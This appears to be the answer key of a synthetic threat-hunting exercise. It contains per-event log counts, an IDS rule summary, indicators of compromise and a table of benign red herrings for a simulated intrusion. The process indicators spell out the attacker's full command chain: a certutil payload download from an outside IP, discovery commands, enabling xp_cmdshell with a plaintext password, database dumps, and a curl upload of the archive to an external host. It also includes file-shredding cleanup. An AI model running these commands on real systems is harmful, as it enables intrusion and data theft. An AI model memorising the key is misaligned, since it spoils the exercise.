| evt-005-account-process-discovery | windows_security | visible: 2 |
| evt-005-account-process-discovery | zeek | visible: 3 |
| evt-006-network-connections | asa | visible: 1 |
| evt-006-network-connections | ecar | visible: 9 |
| evt-006-network-connections | sysmon | visible: 8 |
| evt-006-network-connections | web | visible: 1 |
| evt-006-network-connections | windows_security | visible: 2 |
| evt-006-network-connections | zeek | visible: 3 |
| evt-007-find-config | asa | visible: 1 |
| evt-007-find-config | ecar | visible: 11 |
| evt-007-find-config | sysmon | visible: 10 |
| evt-007-find-config | web | visible: 1 |
| evt-007-find-config | windows_security | visible: 2 |
| evt-007-find-config | zeek | visible: 3 |
| evt-008-read-db-credentials | asa | visible: 1 |
| evt-008-read-db-credentials | ecar | visible: 10 |
| evt-008-read-db-credentials | sysmon | visible: 9 |
| evt-008-read-db-credentials | web | visible: 1 |
| evt-008-read-db-credentials | windows_security | visible: 2 |
| evt-008-read-db-credentials | zeek | visible: 3 |
| evt-009-domain-discovery | asa | visible: 1 |
| evt-009-domain-discovery | ecar | visible: 9 |
| evt-009-domain-discovery | sysmon | visible: 8 |
| evt-009-domain-discovery | web | visible: 1 |
| evt-009-domain-discovery | windows_security | visible: 2 |
| evt-009-domain-discovery | zeek | visible: 3 |
| evt-010-sweep-servers | asa | visible: 361 |
| evt-010-sweep-servers | ecar | visible: 12 |
| evt-010-sweep-servers | syslog | visible: 4 |
| evt-010-sweep-servers | sysmon | filtered: 360, visible: 9 |
| evt-010-sweep-servers | web | visible: 1 |
| evt-010-sweep-servers | windows_security | visible: 62 |
| evt-010-sweep-servers | zeek | visible: 363 |
| evt-011-tool-download-blocked | asa | visible: 4 |
| evt-011-tool-download-blocked | ecar | visible: 13 |
| evt-011-tool-download-blocked | sysmon | visible: 14 |
| evt-011-tool-download-blocked | web | visible: 1 |
| evt-011-tool-download-blocked | windows_security | visible: 7 |
| evt-011-tool-download-blocked | zeek | visible: 10 |
| evt-012-spn-enumeration | asa | visible: 1 |
| evt-012-spn-enumeration | ecar | visible: 6 |
| evt-012-spn-enumeration | sysmon | visible: 5 |
| evt-012-spn-enumeration | web | visible: 1 |
| evt-012-spn-enumeration | windows_security | visible: 2 |
| evt-012-spn-enumeration | zeek | visible: 3 |
| evt-013-enable-xp-cmdshell | asa | visible: 2 |
| evt-013-enable-xp-cmdshell | ecar | visible: 12 |
| evt-013-enable-xp-cmdshell | sysmon | filtered: 1, visible: 10 |
| evt-013-enable-xp-cmdshell | web | visible: 1 |
| evt-013-enable-xp-cmdshell | windows_security | visible: 3 |
| evt-013-enable-xp-cmdshell | zeek | visible: 4 |
| evt-014-db-whoami | ecar | visible: 10 |
| evt-014-db-whoami | sysmon | visible: 9 |
| evt-014-db-whoami | windows_security | visible: 3 |
| evt-015-db-enumerate | ecar | visible: 9 |
| evt-015-db-enumerate | sysmon | visible: 9 |
| evt-015-db-enumerate | windows_security | visible: 2 |
| evt-016-db-find-sensitive | ecar | visible: 18 |
| evt-016-db-find-sensitive | sysmon | visible: 18 |
| evt-016-db-find-sensitive | windows_security | visible: 4 |
| evt-017-db-dump | ecar | visible: 17 |
| evt-017-db-dump | sysmon | visible: 17 |
| evt-017-db-dump | windows_security | visible: 4 |
| evt-018-db-archive | ecar | visible: 8 |
| evt-018-db-archive | sysmon | visible: 8 |
| evt-018-db-archive | windows_security | visible: 2 |
| evt-019-scp-to-bkp01 | ecar | visible: 9 |
| evt-019-scp-to-bkp01 | sysmon | visible: 9 |
| evt-019-scp-to-bkp01 | windows_security | visible: 2 |
| evt-020-bkp01-inspect | asa | filtered: 3, visible: 2 |
| evt-020-bkp01-inspect | bash_history | visible: 3 |
| evt-020-bkp01-inspect | ecar | visible: 14 |
| evt-020-bkp01-inspect | sysmon | filtered: 1, visible: 2 |
| evt-020-bkp01-inspect | windows_security | visible: 2 |
| evt-020-bkp01-inspect | zeek | visible: 11 |
| evt-021-exfiltrate | asa | filtered: 2, visible: 2 |
| evt-021-exfiltrate | bash_history | visible: 3 |
| evt-021-exfiltrate | ecar | visible: 9 |
| evt-021-exfiltrate | sysmon | visible: 2 |
| evt-021-exfiltrate | windows_security | visible: 2 |
| evt-021-exfiltrate | zeek | visible: 8 |
| evt-022-bkp01-cleanup | bash_history | visible: 1 |
| evt-022-bkp01-cleanup | ecar | visible: 2 |
| evt-023-db01-cleanup | ecar | visible: 9 |
| evt-023-db01-cleanup | sysmon | visible: 9 |
| evt-023-db01-cleanup | windows_security | visible: 2 |
| evt-024-disable-xp-cmdshell | asa | visible: 2 |
| evt-024-disable-xp-cmdshell | ecar | visible: 13 |
| evt-024-disable-xp-cmdshell | sysmon | filtered: 1, visible: 11 |
| evt-024-disable-xp-cmdshell | web | visible: 1 |
| evt-024-disable-xp-cmdshell | windows_security | visible: 4 |
| evt-024-disable-xp-cmdshell | zeek | visible: 4 |
| f0da3347-e3a8-42a9-95c0-96f14bce34a9 | ids | visible: 1 |
| f192c748-c1f1-4a42-bff4-39c7daf1cc08 | ids | visible: 1 |
| f29544d8-ab00-412a-ae7a-bc1a98e09b95 | ids | visible: 1 |
| f2a819ac-544b-4583-b7e8-7271e174a034 | ids | visible: 1 |
| f2f1c2c7-1152-46a5-a42f-e06c5391b071 | ids | visible: 1 |
| f3084426-d119-4fec-8567-c1c98011bbe5 | ids | visible: 1 |
| f3193012-8e07-4ad7-8e03-464db16892b0 | ids | visible: 1 |
| f3967e51-7dd3-4b11-9603-fff562bec21e | ids | visible: 1 |
| f3a3aa09-f0bf-4114-8389-7bb0fdecd9af | ids | visible: 1 |
| f49a8750-e9bc-4808-beb6-fc27ebb8b5cc | ids | visible: 1 |
| f4d1b036-81ae-475a-877c-d8359f6648ba | ids | visible: 1 |
| f5afbfc9-117a-44c2-9b74-025b55bc95e0 | ids | visible: 1 |
| f600da40-6fbf-4ccc-ae1c-15107a983ee5 | ids | visible: 1 |
| f7239ace-6540-4204-af26-3b9f28bd536a | ids | visible: 1 |
| f783a4cd-6804-4a09-8fb1-f32605d8d3ed | ids | visible: 1 |
| f7fb2608-b3a9-4645-afcb-b2f419bf133e | ids | visible: 1 |
| f82ea9df-af3e-42fa-b864-d0f0839c7fe5 | ids | visible: 1 |
| f922383e-42ad-4963-ba01-96a303fa229a | ids | visible: 1 |
| f94f4f8c-39b6-4431-b695-12f8c4589fc0 | ids | visible: 1 |
| f95ba8da-649f-417c-9354-f22926df8282 | ids | visible: 1 |
| fa0f2818-5e98-4074-a4a9-2c971353ec6d | ids | visible: 1 |
| fa468b9a-b2c7-4e30-8ecf-33f510f69f4f | ids | visible: 1 |
| faab81ba-0e47-446f-ac01-0a40a86dd09b | ids | visible: 1 |
| fae8d504-7f95-41e6-bde6-c925deaad980 | ids | visible: 1 |
| fb4edda2-1453-4431-9605-42d53b21d697 | ids | visible: 1 |
| fc64bcbf-c1f9-4572-ac68-04180be09dfe | ids | visible: 1 |
| fcb70722-437a-44d5-b6d1-9865f45f6d58 | ids | visible: 1 |
| fccd62b2-5bf4-43fa-8348-b195e499cbc7 | ids | visible: 1 |
| fcd8cf12-2027-4ef8-8c86-c3ad7c9fedfe | ids | visible: 1 |
| fd42a38f-d9e4-4ff6-a5ef-12fff5a8ed76 | ids | visible: 1 |
| fd47367a-3432-43be-a415-ad2310b8c310 | ids | visible: 1 |
| fda22560-7411-4dce-ba00-aae1b620a12a | ids | visible: 1 |
| fdf02fe7-f994-411b-af05-a1ea5abefd0c | ids | visible: 1 |
| fe0ad747-7729-4565-baa5-81472d9fd4fb | ids | visible: 1 |
| fe3c0e15-cf04-4c0a-a244-4ed392b15081 | ids | visible: 1 |
| fe8afb6f-2ed4-42e6-9cc8-f2cf9a8e8f63 | ids | visible: 1 |
| fed22084-9557-4fe9-a928-589033f44d44 | ids | visible: 1 |
| fef0a6ba-1ef5-4bd0-9b56-a9a503d4c2d9 | ids | visible: 1 |
| red_herring:rh-001-internet-scanner | asa | visible: 472 |
| red_herring:rh-001-internet-scanner | ecar | visible: 472 |
| red_herring:rh-001-internet-scanner | ids | filtered: 466, visible: 40 |
| red_herring:rh-001-internet-scanner | web | visible: 401 |
| red_herring:rh-001-internet-scanner | zeek | visible: 1274 |
| red_herring:rh-002-authorized-vuln-scan | asa | filtered: 240 |
| red_herring:rh-002-authorized-vuln-scan | ecar | visible: 533 |
| red_herring:rh-002-authorized-vuln-scan | sysmon | filtered: 200, visible: 573 |
| red_herring:rh-002-authorized-vuln-scan | windows_security | visible: 160 |
| red_herring:rh-002-authorized-vuln-scan | zeek | visible: 240 |
| red_herring:rh-003-nightly-backup-day1 | ecar | visible: 10 |
| red_herring:rh-003-nightly-backup-day1 | sysmon | visible: 9 |
| red_herring:rh-003-nightly-backup-day1 | windows_security | visible: 3 |
| red_herring:rh-004-nightly-backup-day2 | ecar | visible: 9 |
| red_herring:rh-004-nightly-backup-day2 | sysmon | visible: 9 |
| red_herring:rh-004-nightly-backup-day2 | windows_security | visible: 2 |


## IDS Evaluation Summary

Observation totals: filtered=484, visible=658.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| ids01 | 1:2000105 | 11 | 11 | 0 | built_in=11 | `477c53646b98` |
| ids01 | 1:2000334 | 12 | 12 | 0 | built_in=12 | `b3753cd7f105` |
| ids01 | 1:2000357 | 14 | 14 | 0 | built_in=14 | `dc1c6fbbb209` |
| ids01 | 1:2000560 | 12 | 12 | 0 | built_in=12 | `0d6659f2d5cc` |
| ids01 | 1:2000575 | 72 | 72 | 0 | built_in=72 | `27d948f598c3` |
| ids01 | 1:2002910 | 490 | 6 | 484 | authored_attachment=6 | `60dbf5a191fb` |
| ids01 | 1:2003068 | 73 | 73 | 0 | built_in=73 | `2eb407592c73` |
| ids01 | 1:2008186 | 1 | 1 | 0 | built_in=1 | `5696555a9dc8` |
| ids01 | 1:2009582 | 9 | 9 | 0 | built_in=9 | `26b9fd677eb3` |
| ids01 | 1:2009714 | 8 | 8 | 0 | built_in=8 | `6cae90a40fcc` |
| ids01 | 1:2010935 | 7 | 7 | 0 | built_in=7 | `cb326f524e57` |
| ids01 | 1:2012647 | 1 | 1 | 0 | authored_attachment=1 | `0247ed23b910` |
| ids01 | 1:2012887 | 11 | 11 | 0 | built_in=11 | `423da9831c76` |
| ids01 | 1:2013028 | 14 | 14 | 0 | built_in=14 | `dc3545cce2dc` |
| ids01 | 1:2016149 | 43 | 43 | 0 | built_in=43 | `63b303ccf069` |
| ids01 | 1:2022476 | 17 | 17 | 0 | built_in=17 | `9e031e1a97ee` |
| ids01 | 1:2024291 | 31 | 31 | 0 | built_in=31 | `81ad80317479` |
| ids01 | 1:2027757 | 30 | 30 | 0 | built_in=30 | `3ad4b29f2923` |
| ids01 | 1:2027863 | 29 | 29 | 0 | built_in=29 | `151d2fc165c3` |
| ids01 | 1:2027865 | 32 | 32 | 0 | built_in=32 | `c631933bb912` |
| ids01 | 1:2028401 | 16 | 16 | 0 | built_in=16 | `8f850f2c9308` |
| ids01 | 1:2029706 | 29 | 29 | 0 | built_in=29 | `b5d04f9a5a40` |
| ids01 | 1:2101411 | 33 | 33 | 0 | built_in=33 | `a904aa05bae5` |
| ids01 | 1:384 | 82 | 82 | 0 | built_in=82 | `4c74200936fe` |
| ids01 | 1:480 | 65 | 65 | 0 | built_in=65 | `e9be31728f19` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.20.50:22 (Lateral Movement)
- 203.0.113.10:80 (Internal Server)
- 5.188.206.34:443 (C2 Server)
- Port 135 (scan target)
- Port 1433 (scan target)
- Port 22 (scan target)
- Port 3389 (scan target)
- Port 445 (scan target)
- Port 5985 (scan target)
- Zeek UID: C1AjbnCkmslAU0tqzkS
- Zeek UID: C3y8tFE9bglMzOPSPY
- Zeek UID: C5inewwXXePPhdSH1r
- Zeek UID: C76mWomhY2OVcUWdw
- Zeek UID: C7WPi0aiGhzEGomweVC
- Zeek UID: CESud5RcAta0ES0LgUp
- Zeek UID: CJcAMD83ZtzC9AdFFi0
- Zeek UID: CMHIspWhItlmCXCokI
- Zeek UID: CUom9mNvSDNWHWHgp
- Zeek UID: CXDp9hkwECXMiUzANh
- Zeek UID: CXKaANQcG6CeQOpCH1D
- Zeek UID: Cb0w5wjtYUuIg87deJd
- Zeek UID: CgWd6uhjqawZNCEh4j
- Zeek UID: Cjgi5UtO4RdObFe0Ub
- Zeek UID: CpFegULN4fWuy8FwG9
- Zeek UID: Cs99O1dbld2Owhvch
- Zeek UID: CuDK7QjUM2VtUNp9fh
- Zeek UID: CwmQk7V9S8qWaYFPqr

### Process IOCs

- /usr/bin/curl
- /usr/bin/df
- /usr/bin/ls
- /usr/bin/shred
- C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\certutil.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\php-cgi.exe
- C:\Windows\System32\scp.exe
- C:\Windows\System32\setspn.exe
- `C:\Windows\System32\php-cgi.exe`
- `certutil.exe -urlcache -split -f http://45.83.64.201/svc.exe C:\Windows\Temp\svc.exe`
- `cmd.exe /c "hostname & systeminfo & ipconfig /all"`
- `cmd.exe /c "net user & net localgroup administrators & tasklist /svc"`
- `cmd.exe /c "netstat -ano & arp -a & route print"`
- `cmd.exe /c "nltest /dclist:calloway.local & nltest /domain_trusts & net group \"Domain Admins\" /domain"`
- `cmd.exe /c "sqlcmd -E -Q \"SELECT name,create_date FROM sys.databases\" & dir D:\SQLData"`
- `cmd.exe /c "whoami & hostname & ipconfig /all"`
- `cmd.exe /c bcp "SELECT * FROM ERP.dbo.ContractPricing" queryout C:\Windows\Temp\cp.dat -c -T -S localhost`
- `cmd.exe /c bcp "SELECT * FROM ERP.dbo.CustomerAccounts" queryout C:\Windows\Temp\ca.dat -c -T -S localhost`
- `cmd.exe /c del /f /q C:\Windows\Temp\ca.dat C:\Windows\Temp\cp.dat C:\Windows\Temp\sqlmaint.zip`
- `cmd.exe /c dir /s /b C:\inetpub\wwwroot\portal\*config*`
- `cmd.exe /c sqlcmd -E -d ERP -Q "SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%Customer%' OR TABLE_NAME LIKE '%Price%' OR TABLE_NAME LIKE '%Bank%'"`
- `cmd.exe /c sqlcmd -E -d ERP -Q "SELECT TOP 5 * FROM dbo.CustomerAccounts"`
- `cmd.exe /c type C:\inetpub\wwwroot\portal\includes\config.php`
- `cmd.exe /c whoami /all`
- `curl -sS -T /var/backups/db/sqlmaint.zip https://static.cloudmetric-cdn.com/u/9f2c1d4e`
- `curl -sS -m 5 -I https://static.cloudmetric-cdn.com/`
- `df -h /var/backups`
- `ls -la /var/backups/db/`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path C:\Windows\Temp\ca.dat,C:\Windows\Temp\cp.dat -DestinationPath C:\Windows\Temp\sqlmaint.zip"`
- `powershell.exe -NoProfile -NonInteractive -Command "foreach($i in 1..254){foreach($p in 22,135,445,1433,3389,5985){Test-NetConnection -ComputerName 10.10.20.$i -Port $p -InformationLevel Quiet}}"`
- `scp.exe -i C:\ProgramData\SQLBackup\id_ed25519 -o StrictHostKeyChecking=no C:\Windows\Temp\sqlmaint.zip svc-backup@10.10.20.50:/var/backups/db/sqlmaint.zip`
- `setspn.exe -T calloway.local -Q MSSQLSvc/*`
- `shred -u /var/backups/db/sqlmaint.zip`
- `sqlcmd.exe -S DB01 -U portal_app -P Prt#2026db -Q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"`
- `sqlcmd.exe -S DB01 -U portal_app -P Prt#2026db -Q "EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE"`

### User IOCs

- svc-backup (compromised account)
- svc-portal (compromised account)
- svc-sql (compromised account)


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2026-10-19 06:09:49 UTC | svc-backup | DB01 | Nightly ERP backup copied from DB01 to BKP01 with the backup job's SSH key | Legitimate scp from DB01 to BKP01 using the same key and destination directory that the intruder reuses later. Hunters should baseline this nightly transfer (service account svc-backup, .bak file, ~01:10 local) to separate it from the attacker's sqlmaint.zip copy performed by svc-sql in the late morning. |
| 2026-10-19 19:29:47 UTC | carlos.alvarez | WS-IT-04 | Authorized internal vulnerability scan of the server segment by the security analyst | Scheduled internal scan against the servers segment from the security analyst's workstation (change-approved). Produces a burst of connections to 22/135/445/1433/3389/5985 that resembles the intruder's later sweep from WEB01 but originates from an IT workstation during business hours. |
| 2026-10-20 01:05:10 UTC | svc-portal | WEB01 | Opportunistic internet scanner brute-forces common paths on the public portal | Benign-to-this-case background noise: a commodity scanner (unrelated to the intruder, different source IP, no upload or POST success) generates many 404s against WEB01. Hunters should not conflate it with the 45.83.64.201 exploitation. |
| 2026-10-20 06:10:18 UTC | svc-backup | DB01 | Nightly ERP backup copied from DB01 to BKP01 with the backup job's SSH key | Second occurrence of the legitimate nightly backup transfer, immediately before the intrusion begins. |
